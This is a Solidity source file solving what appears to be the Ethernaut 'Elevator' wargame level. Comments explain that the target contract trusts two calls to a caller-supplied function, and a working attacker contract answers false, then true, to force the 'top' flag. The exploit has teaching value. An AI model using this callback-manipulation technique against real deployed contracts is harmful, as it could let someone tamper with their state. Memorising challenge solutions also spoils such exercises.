/*
pragma solidity ^0.4.18;


interface Building {
    function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (! building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}


If you analyze the code of the Elevator contract, it checks whether it is isLastFloor twice.
In order to set top to true,
the first call to isLastFloor has to return false and the second one, true.

Currently, the Solidity compiler does nothing to enforce that a view or constant function is not modifying state.
The same applies to pure functions, which should not read state but they can. Make sure you read Solidity's documentation and learn its caveats.
An alternative way to solve this level is to build a view function which returns different results depends on
input data but don't modify state, e.g. gasleft().
*/

pragma solidity ^0.4.18;

contract Elevator {
    function goTo(uint _floor) public;
}

contract Building {
    bool private cheat;
    
    constructor() public {
        cheat = false;
    }
    
    // Don't use view modifier!
    function isLastFloor(uint) public returns (bool) {
        // first call
        if (!cheat) {
            cheat = true;
            return false;
        }
        // second call
        return true;
    }
  
    function trigger(address _elevator) public {
        Elevator el = Elevator(_elevator);
        el.goTo(10);
    }
}